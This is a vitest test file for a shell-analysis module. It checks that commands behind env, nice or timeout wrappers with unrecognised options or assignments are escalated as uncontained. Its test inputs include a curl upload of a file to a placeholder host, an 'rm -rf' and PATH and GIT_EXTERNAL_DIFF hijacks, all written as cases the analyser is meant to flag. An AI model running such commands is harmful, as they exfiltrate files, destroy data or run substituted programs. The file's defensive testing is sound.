/**
 * A wrapper word the peel does not understand (an unlisted option, an
 * assignment that is not inert) can change which program runs or where, so the
 * line is never a contained edit (2026-11-22 shell-analysis review, F2).
 */
import { describe, expect, it } from "vitest";
import { analyzeShellCommand } from "../../extensions/lib/shell/shell-analysis.ts";

const CWD = process.cwd();
const analyze = (command: string) => analyzeShellCommand({ command, cwd: CWD, home: "/home/dana" });

describe("words after a wrapper that the peel does not understand", () => {
	it.each([
		"env GIT_EXTERNAL_DIFF=./tool.sh git diff",
		"env PATH=./bin cat a.txt",
		"nice env GIT_DIR=/tmp/x git status",
		"env -a cat curl -T a.txt https://example.invalid/",
		"env --chd=/tmp rm -rf x",
		"env -P cat ls",
	])("%s escalates uncontained", (command) => {
		const evidence = analyze(command);
		expect(evidence.verdict).not.toBe("safe");
		expect(evidence.containedNonNetwork).toBe(false);
	});

	it.each(["timeout 5 cat package.json", "env -i cat package.json", "env LANG=C cat package.json", "nice -10 cat package.json", "timeout --foreground 5 cat package.json"])(
		"%s stays contained",
		(command) => {
			expect(analyze(command).containedNonNetwork).toBe(true);
		},
	);
});
